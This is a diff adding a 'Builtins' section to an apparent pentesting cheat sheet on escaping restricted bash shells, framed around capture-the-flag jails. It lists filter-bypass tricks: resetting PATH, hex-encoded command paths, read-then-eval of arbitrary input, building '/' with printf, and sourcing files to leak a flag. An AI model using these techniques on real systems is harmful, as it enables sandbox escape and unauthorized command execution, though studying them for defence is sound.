@@ -156,6 +156,51 @@ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 
 You could use **burpcollab** or [**pingb**](http://pingb.in) for example.
 
+### Builtins
+
+In case you cannot execute external functions and only have access to a **limited set of builtins to obtain RCE**, there are some handy tricks to do it. Usually you **won't be able to use all** of the **builtins**, so you should **know all your options** to try to bypass the jail. Idea from [**devploit**](https://twitter.com/devploit).\
+First of all check all the [**shell builtins**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Then here you have some **recommendations**:
+
+```bash
+# Get list of builtins
+declare builtins
+
+# In these cases PATH won't be set, so you can try to set it
+PATH="/bin" /bin/ls
+export PATH="/bin"
+declare PATH="/bin"
+SHELL=/bin/bash
+
+# Hex
+$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
+$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
+
+# Input
+read aaa; exec $aaa #Read more commands to execute and execute them
+read aaa; eval $aaa
+
+# Get "/" char using printf and env vars
+printf %.1s "$PWD"
+## Execute /bin/ls
+$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
+## To get several letters you can use a combination of printf and
+declare
+declare functions
+declare historywords
+
+# Read flag in current dir
+source f*
+flag.txt:1: command not found: CTF{asdasdasd}
+
+# Get env variables
+declare
+
+# Get history
+history
+declare history
+declare historywords
+```
+
 ### Polyglot command injection
 
 ```bash
